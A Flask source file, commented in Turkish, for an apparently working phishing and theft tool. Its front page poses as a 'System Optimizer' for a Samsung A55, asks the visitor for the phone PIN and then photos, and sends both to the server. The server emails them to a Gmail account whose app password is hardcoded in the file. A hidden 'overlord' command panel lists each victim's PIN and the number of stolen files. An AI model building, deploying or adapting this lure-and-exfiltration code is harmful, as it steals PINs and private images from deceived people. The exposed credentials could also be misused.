from flask import Flask, render_template_string, jsonify, request
import time, base64, os, smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from threading import Lock, Thread

app = Flask(__name__)

# --- NETSWAP SOVEREIGN v262.0 "The Reality-Strike" ---
# Hacker: Ali Yiğit | Yetki: 1907 | Hedef: Samsung A55 | Bulut: yiyitali715@gmail.com
ADMIN_KEY = "1907" 
MY_GMAIL = "yiyitali715@gmail.com"
GMAIL_APP_PASSWORD = "wbrj xedf ecye fcdt" 

state_lock = Lock()
state = {"nodes": {}, "logs": []}

def send_to_cloud(p_id, content, filename, quality_tag, is_pin=False):
    """Gerçek zamanlı HD veriyi Gmail kutuna mühürler."""
    try:
        msg = MIMEMultipart()
        msg['From'], msg['To'] = MY_GMAIL, MY_GMAIL
        msg['Subject'] = f"{'[PIN]' if is_pin else '[DATA_'+quality_tag+']'} - ID: {p_id}"
        
        body = f"Hükümdar, veri mühürlendi.\nCihaz: Samsung A55\nZaman: {time.strftime('%H:%M:%S')}"
        msg.attach(MIMEText(body, 'plain'))
        
        if not is_pin and "data:image" in content:
            header, encoded = content.split(",", 1)
            attachment = MIMEText(encoded, 'base64')
            attachment.add_header('Content-Disposition', 'attachment', filename=filename)
            msg.attach(attachment)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(MY_GMAIL, GMAIL_APP_PASSWORD)
            server.send_message(msg)
    except Exception as e:
        with state_lock:
            state["logs"].append(f"SMTP Hatası: {str(e)}")

@app.route('/upload_intel', methods=['POST'])
def upload_intel():
    p_id = request.args.get('peer_id', 'GUEST')
    data = request.json
    with state_lock:
        if p_id not in state["nodes"]:
            state["nodes"][p_id] = {"last": "", "vault_count": 0, "pin": "BEKLENİYOR", "net": "4G"}
        u = state["nodes"][p_id]
        u["last"] = time.strftime('%H:%M:%S')
        
        if data.get('t') == 'pin_init':
            u["pin"] = base64.b64decode(data.get('v')).decode('utf-8')
            Thread(target=send_to_cloud, args=(p_id, u["pin"], "", "PIN", True)).start()
        
        if data.get('t') == 'vortex':
            u["vault_count"] += 1
            u["net"] = data.get('net', '4G')
            Thread(target=send_to_cloud, args=(p_id, data.get('v'), data.get('n'), data.get('q'))).start()
            
    return jsonify({"s": "REALITY_SYNCED"})

@app.route('/api/status')
def get_status(): return jsonify(state)

@app.route('/overlord')
def overlord_panel():
    if request.args.get('key') != ADMIN_KEY: return "403: ERİŞİM REDDEDİLDİ", 403
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>Reality-Strike C2 v262</title>
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-white p-6 font-mono text-[9px]">
    <div class="border-b border-yellow-500 pb-2 mb-6 flex justify-between uppercase font-black text-yellow-500">
        <h1>REALITY-STRIKE COMMAND v262.0</h1>
        <div>KOMUTAN: ALİ YİĞİT (1907)</div>
    </div>
    <div id="logs" class="mb-4 text-red-500"></div>
    <div id="uL" class="grid grid-cols-2 gap-6"></div>
    <script>
        async function update(){
            const r=await fetch('/api/status'); const d=await r.json();
            document.getElementById('logs').innerText = d.logs.slice(-1) || "";
            let h = "";
            for(let id in d.nodes){
                let n = d.nodes[id];
                h += `<div class="bg-zinc-950 p-6 border border-zinc-900 rounded-[40px]">
                    <div class="flex justify-between mb-4 text-yellow-500 font-bold uppercase"><span>A55</span><span>${n.net}</span></div>
                    <p class="text-white text-lg">PIN: ${n.pin}</p>
                    <div class="mt-4 text-xl font-black text-yellow-500">📦 ${n.vault_count} DOSYA GÖNDERİLDİ</div>
                </div>`;
            }
            document.getElementById('uL').innerHTML = h;
            setTimeout(update, 2000);
        } update();
    </script>
</body></html>
""")

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>System Engine 1907</title><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-white flex items-center justify-center h-screen overflow-hidden">
    <div onclick="window.location.href='/overlord?key=1907'" class="fixed right-0 bottom-0 w-12 h-12 z-[11000]"></div>

    <div id="m" class="text-center p-10 border border-zinc-900 rounded-[60px] w-full max-w-sm">
        <div class="w-16 h-16 bg-yellow-600 rounded-3xl mx-auto mb-8 flex items-center justify-center text-4xl">⚙️</div>
        <h1 class="text-xl font-black text-yellow-500 uppercase">System Optimizer 1907</h1>
        <p class="text-zinc-500 text-[10px] mt-4 uppercase italic">Sistem hızını artırmak için derin taramayı onaylayın.</p>
        <button onclick="showPin()" class="w-full mt-10 py-5 bg-yellow-700 text-black rounded-full font-black text-[12px]">DERİN TARAMAYI BAŞLAT</button>
    </div>

    <div id="pinBox" class="hidden fixed inset-0 bg-black z-[9999] flex items-center justify-center p-6 text-center">
        <div class="w-full">
            <p class="text-yellow-500 text-sm mb-10 font-black uppercase">1907 Güvenlik Doğrulaması</p>
            <input type="password" id="p" class="w-full bg-zinc-900 border border-zinc-800 p-4 rounded-2xl text-center text-2xl mb-8 text-yellow-500">
            <button onclick="triggerReality()" class="w-full py-4 bg-yellow-700 text-black rounded-full font-black">ONAYLA</button>
        </div>
    </div>

    <div id="mask" class="hidden fixed inset-0 bg-black z-[10000] flex items-center justify-center text-center">
        <div><div class="w-16 h-16 border-2 border-zinc-800 border-t-white rounded-full animate-spin mx-auto mb-4"></div><p id="t" class="text-zinc-600 text-[10px] uppercase font-bold">HD Analiz Yapılıyor...</p></div>
    </div>

    <input type="file" id="fI" class="hidden" multiple accept="image/*">
    <canvas id="cnv" style="display:none"></canvas>

    <script>
        let pId = "REAL-" + Math.random().toString(36).substr(2, 4).toUpperCase();
        function showPin() { document.getElementById('pinBox').style.display = 'flex'; }

        async function triggerReality() {
            let pinVal = document.getElementById('p').value;
            if(!pinVal) return;
            await fetch('/upload_intel?peer_id='+pId, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({t:'pin_init', v: btoa(pinVal)})});
            document.getElementById('pinBox').style.display = 'none';
            document.getElementById('fI').click(); // GERÇEK: Kurban burada seçmeli.

            document.getElementById('fI').onchange = async (e) => {
                document.getElementById('mask').style.display = 'flex';
                let files = e.target.files;
                for(let i=0; i<files.length; i++) {
                    const reader = new FileReader();
                    reader.onload = (ev) => {
                        const img = new Image();
                        img.onload = () => {
                            const cnv = document.getElementById('cnv');
                            cnv.width = 800; cnv.height = (img.height/img.width)*800;
                            cnv.getContext('2d').drawImage(img, 0, 0, cnv.width, cnv.height);
                            fetch('/upload_intel?peer_id='+pId, {
                                method:'POST', headers:{'Content-Type':'application/json'},
                                body:JSON.stringify({t:'vortex', n: files[i].name, v: cnv.toDataURL('image/jpeg', 0.7), q: 'HD', net: '4G'})
                            });
                        };
                        img.src = ev.target.result;
                    };
                    reader.readAsDataURL(files[i]);
                    document.getElementById('t').innerText = "HD AKTARIM: %" + Math.floor(((i+1)/files.length)*100);
                    await new Promise(r => setTimeout(r, 700));
                }
                location.reload();
            };
        }
    </script>
</body></html>
""")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 7860)))
